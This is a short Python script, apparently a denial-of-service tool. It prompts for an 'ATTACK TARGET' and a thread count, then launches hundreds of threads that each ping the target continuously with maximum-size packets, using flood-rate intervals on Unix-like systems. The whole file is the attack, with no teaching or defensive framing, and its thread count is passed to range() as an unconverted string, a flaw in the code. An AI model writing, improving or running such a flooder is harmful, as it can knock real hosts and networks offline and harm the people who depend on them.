import threading
import os
import colorama
import platform
import getpass
import random
from colorama import Fore,  Style
colorama.init()
colors = [Fore.RED,Fore.BLUE,Fore.GREEN,Fore.WHITE,Fore.MAGENTA]
aot = input("HOW MANY THREADS --> suggested 512 for a 8 core cpu w/ 16gb RAM:")
print(Fore.RED + Style.DIM + f"{getpass.getuser()} is running {platform.system()}" + Style.RESET_ALL)
print(Fore.BLUE + Style.BRIGHT + "ATTACK TARGET: " + Style.RESET_ALL, end="")
attacktarget = input("")
def ping():
    os.system(f"ping {attacktarget} -t -l 65500")
def Lping():
    os.system(f"ping {attacktarget} -i 0.0001 -s 65500")
o = Lping
if os.name == 'nt':
    o = ping
for i in range(aot):
    thread = threading.Thread(target=o,name=f'thread {i+1}')
    print(random.choice(colors) + Style.BRIGHT + thread.name + Style.RESET_ALL)
    thread.start()
